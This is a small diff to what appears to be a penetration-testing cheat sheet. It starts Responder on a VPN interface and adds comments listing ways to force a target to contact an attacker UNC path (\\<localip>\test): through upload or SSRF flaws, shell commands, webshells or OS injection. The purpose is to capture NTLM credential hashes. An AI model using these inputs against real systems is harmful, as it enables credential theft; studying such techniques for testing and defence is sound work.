@@ -2,4 +2,9 @@
 
 sudo responder -I tun0
 
-#The most common scenario is SMB login.
+#The most common scenario is SMB login. Some of the SMB request could be
+
+# - In an upload functionality or SSRF vulnerability: \\<localip>\test
+# - In a shell/cmd; dir \\<localip>\test
+# - In a webshell or OS Injection vuln, \\\\<localip>\\test
+
